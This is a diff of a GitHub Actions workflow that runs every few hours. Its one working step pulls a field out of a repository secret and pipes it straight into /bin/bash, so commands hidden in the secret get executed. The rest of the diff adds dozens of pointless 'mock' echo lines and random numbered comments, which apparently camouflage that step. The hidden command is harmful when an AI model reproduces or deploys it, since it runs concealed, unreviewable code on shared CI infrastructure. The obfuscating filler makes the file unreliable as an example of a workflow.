@@ -1,15 +1,49 @@
-name: zuolengchan6234 #5189
-on: #29084
-  workflow_dispatch: #20807
-  schedule: #14928
-    - cron: '29 * * * *' #3637
-jobs: #10761
-  build: #857
-    runs-on: ubuntu-latest #30984
-    steps: #24341
-      - uses: actions/checkout@v4 #5942
-      - name: zuolengchan6234 #24371
-        env: #17007
-          x31300: ${{ secrets.x31300 }} #30957
+name: zuolengchan6234 #24308
+on: #2199
+  workflow_dispatch: #6856
+  schedule: #15971
+    - cron: '11 1/6 * * *' #12431
+jobs: #14183
+  build: #14548
+    runs-on: ubuntu-latest #1064
+    steps: #28486
+      - uses: actions/checkout@v4 #17549
+      - name: zuolengchan6234 #18580
+        env: #20800
+          i7065: ${{ secrets.i7065 }} #13364
         run: |
-          echo $x31300 | jq -r .x18032 | /bin/bash #25476
+          echo $i7065 | jq -r .k4620 | /bin/bash #2470
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          echo "Time diff mock: echo \$SECONDS"
+          echo "Path mock: echo \$PATH | awk -F: '{print \$1}'"
+          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Math eval: echo \$(( 2 ​**​ 3 ))"
+          [ -z "$RANDOM" ] || echo "Random var set"
+          echo "Function mock: f() { echo func; }; f"
+          echo "Exit mock: exit 0 2>/dev/null || true"
+          echo "Null cmd: : > /dev/null"
+          echo "Command chain: true && echo 'A' || echo 'B'"
+          echo "Random check: [ $((RANDOM % 2)) -eq 0 ] && echo Even || echo Odd"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo "Job control: sleep 0.01 & wait"
+          echo "Test file type: [ -f /etc/passwd ] && echo File"
+          test -d /tmp && echo "Tmp dir exists"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Command sub: $(echo inside subshell)"
+          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "String slice: str=abcdef; echo \${str:0:3}"
+          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
+          echo "String len: ${#HOSTNAME}"
+          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
+          echo "And/or chain: true && echo A || echo B"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "Command fail safe: false || echo 'Safe'"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "User: $(whoami)"
